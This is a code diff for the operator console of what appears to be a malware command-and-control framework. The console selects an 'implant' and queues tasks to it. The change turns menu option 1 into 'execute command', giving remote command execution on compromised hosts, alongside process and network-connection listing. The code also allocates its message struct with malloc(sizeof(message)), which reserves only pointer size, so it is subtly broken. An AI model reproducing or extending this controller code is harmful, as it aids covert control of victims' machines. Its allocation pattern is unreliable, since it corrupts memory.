@@ -9,8 +9,6 @@
 #include "base.h"
 #include "console.h"
 
-#define BUFFERSIZE 256
-
 // Global variables
 extern struct implant_poll *poll_struct;
 extern pthread_mutex_t poll_lock;
@@ -24,7 +22,7 @@ extern pthread_mutex_t send_queue_lock;
 int agent_console(int agent_fd){
 	const char* menu = "Implant %d selected.\n"
 				 "Provide an option.\n"
-				 "1 - send message\n"
+				 "1 - execute command\n"
 				 "2 - get processes (ps -aux)\n"
 				 "3 - get network statistics (netstat -plantu)\n"
 				 "4 - go back\n\n";
@@ -40,12 +38,13 @@ int agent_console(int agent_fd){
 		switch(option){
 	        case 1:
 	        	message = malloc(sizeof(message));
-	        	message->sockfd = agent_fd;
+	        	message->id = agent_fd;
 	        	
 	        	printf("What do you want to send?\n");
 	        	message->buffer = malloc(BUFFERSIZE);
 	        	memset(message->buffer, 0, BUFFERSIZE);
 	        	fgets(message->buffer, BUFFERSIZE - 1, stdin);
+	        	message->size = strlen(message->buffer);
 	        	
 	        	pthread_mutex_lock(&send_queue_lock);
 	        	enqueue(send_queue, message);
@@ -53,11 +52,12 @@ int agent_console(int agent_fd){
 	        	break;
 	        case 2:
 	        	message = malloc(sizeof(message));
-	        	message->sockfd = agent_fd;
+	        	message->id = agent_fd;
 
 				message->buffer = malloc(BUFFERSIZE);
 				memset(message->buffer, 0, BUFFERSIZE);
 	        	strcpy(message->buffer, "process\n");
+	        	message->size = strlen("process\n");
 	        	
 	        	pthread_mutex_lock(&send_queue_lock);
 	        	enqueue(send_queue, message);
@@ -65,11 +65,12 @@ int agent_console(int agent_fd){
 	        	break;
 	        case 3:
 	        	message = malloc(sizeof(message));
-	        	message->sockfd = agent_fd;
+	        	message->id = agent_fd;
 	        
 	        	message->buffer = malloc(BUFFERSIZE);
 	        	memset(message->buffer, 0, BUFFERSIZE);
 	        	strcpy(message->buffer, "netstat\n");
+	        	message->size = strlen("netstat\n");
 	        	
 	        	pthread_mutex_lock(&send_queue_lock);
 	        	enqueue(send_queue, message);
